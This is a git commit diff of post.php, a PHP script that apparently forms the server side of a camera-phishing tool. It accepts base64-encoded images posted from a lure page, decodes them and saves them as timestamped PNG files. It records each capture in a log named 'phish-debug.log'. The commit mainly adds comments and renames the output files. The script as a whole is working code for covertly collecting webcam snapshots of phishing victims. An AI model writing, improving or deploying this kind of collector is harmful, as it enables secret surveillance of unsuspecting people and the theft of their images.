6be426ff1a295dee33d22fea10b753acee6afcee
HATANHack <ebrahimalsmiri12345@gmail.com>
2025-10-06 18:27:14 +0300

    Update post.php

--- post.php
+++ post.php
@@ -1,19 +1,25 @@
 <?php
 
+// Define date and time for creating a unique filename
 $date = date('dMYHis');
 $imageData=$_POST['cat'];
 
+// Check if data (image) exists before processing
 if (!empty($_POST['cat'])) {
-error_log("Received" . "\r\n", 3, "Log.log");
-
+    // Log the reception process in your custom log file
+    error_log("Image received successfully by HatanHack's tool at: " . date('Y-m-d H:i:s') . "\r\n", 3, "phish-debug.log");
 }
 
+// Remove the data encoding part (base64 header)
 $filteredData=substr($imageData, strpos($imageData, ",")+1);
+
+// Decode data from base64
 $unencodedData=base64_decode($filteredData);
-$fp = fopen( 'cam'.$date.'.png', 'wb' );
+
+// Save the data as a PNG image with a unique name (using 'shot' prefix)
+$fp = fopen( 'shot'.$date.'.png', 'wb' );
 fwrite( $fp, $unencodedData);
 fclose( $fp );
 
 exit();
 ?>
-
